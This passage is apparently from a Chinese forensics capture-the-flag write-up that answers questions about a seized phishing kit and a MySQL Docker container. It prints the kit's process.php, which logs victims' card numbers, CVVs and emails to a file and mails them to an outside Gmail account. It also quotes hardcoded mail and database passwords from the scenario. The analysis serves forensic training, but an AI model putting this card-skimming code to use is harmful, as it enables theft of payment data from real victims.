&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$email&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;email&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$email_domn&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;email_domn&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;// 设置档案名称
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$resultFile&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;vu.txt&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;// 打开档案并写入数据
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;fopen&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$resultFile&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Date &amp;amp; Time: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$dateTime&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Card Holder: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$holdername&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Card no.: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$cardno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;cvv: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$cvv&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;expire date: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$exp_mth&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$exp_yr&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Email: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$email&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;@&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$email_domn&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Browser Info: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$browser&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fwrite&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#7f848e&#34;&gt;//End of Entry
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fclose&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$fOpen&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;PHPMailer\PHPMailer\SMTP&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;require_once&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;__DIR__&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;/vendor/phpmailer/src/Exception.php&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;PHPMailer&lt;/span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;true&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;isSMTP&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Host&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;smtp.gmai1.com&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;SMTPAuth&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;SMTPSecure&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;PHPMailer&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;ENCRYPTION_STARTTLS&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Port&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;587&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Username&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;chunhe11amm@gmail.com&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;rtatsceucpacocbdacs&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;setFrom&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;chunhe11amm@gmail.com&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;Smith&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;addAddress&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;chunhe11amm@gmail.com&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;Tyler&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;IsHTML&lt;/span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;true&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Subject&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;vu&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Body&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$message&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;AltBody&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;send&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;它做了两件事：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;产生档案&lt;/strong&gt;：把受害人提交的数据写入&lt;code&gt;vu.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;发出邮件&lt;/strong&gt;：将提交的数据通过PHPMailer发送到指定邮箱&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BC
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;63检视档案processphp-源码-林浚照的电邮密码是以大写英文回答&#34;&gt;63.检视档案process.php&amp;rsquo; 源码, 林浚照的电邮密码是?(以大写英文回答)
&lt;/h2&gt;&lt;p&gt;上一题的代码就能看出来，有这样一行：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$mail&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;rtatsceucpacocbdacs&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也就是说电邮密码是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RTATSCEUCPACOCBDACS
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;64分析档案processphp-源码-它不会收集哪些资料&#34;&gt;64.分析档案process.php&amp;rsquo; 源码, 它不会收集哪些资料?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. GPS位置&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 信用卡号码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 短讯验证码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 电话号码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;E. 电邮地址&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;还是看源码，不多赘述了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ACD
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;65虚拟机-vm-安装了-docker-程序列出一个以5作为开端的-docker-镜像-image-id-以阿拉伯数字及大写英文回答&#34;&gt;65.虚拟机 (VM) 安装了 Docker 程序，列出一个以&#39;5&amp;rsquo;作为开端的 &amp;lsquo;Docker&amp;rsquo; 镜像 (Image) ID (以阿拉伯数字及大写英文回答)
&lt;/h2&gt;&lt;p&gt;这也能作为题目吗&amp;hellip;&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815210651299&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815210651299.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815210651299.png&#34; alt=&#34;image-20250815210651299&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;5d58c024174d
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;66docker-容器-container-mysql-对外开放的通讯端口-port-是&#34;&gt;66.Docker 容器 (Container) &amp;lsquo;mysql&amp;rsquo; 对外开放的通讯端口 (Port) 是?
&lt;/h2&gt;&lt;p&gt;启动看一眼：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815210829763&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815210829763.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815210829763.png&#34; alt=&#34;image-20250815210829763&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;43306
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;67docker容器mysql用户root-的密码是以大写英文及阿拉伯数字回答&#34;&gt;67.Docker容器mysql，用户&amp;rsquo;root&amp;rsquo; 的密码是?(以大写英文及阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;查看命令历史记录：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815211019920&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815211019920.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815211019920.png&#34; alt=&#34;image-20250815211019920&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2wsx3edc
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;68docker容器mysql-里哪一个数据库储存了大量个人资料以大写英文回答&#34;&gt;68.Docker容器，mysql 里哪一个数据库储存了大量个人资料?(以大写英文回答)
&lt;/h2&gt;&lt;p&gt;在本机链接数据库，账号密码root/2wsx3edc，一找就找到了：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815211402518&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815211402518.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815211402518.png&#34; alt=&#34;image-20250815211402518&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CUSTOMER
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;69检视-docker-容器mysql-内数据库里的资料李大辉的出生日期是如答案为-2022-12-29需答-20221229&#34;&gt;69.检视 Docker 容器&amp;rsquo;mysql&amp;rsquo; 内数据库里的资料，李大辉的出生日期是?(如答案为 2022-12-29，需答 20221229)
&lt;/h2&gt;&lt;p&gt;sql查询（不知道为什么搜名字搜不出来，可能是过滤条件没写好，电话在李大辉手机可以得到）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;DOB&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;customer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Tel&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;852-56412770&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815211941873&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815211941873.png&#34;&gt;
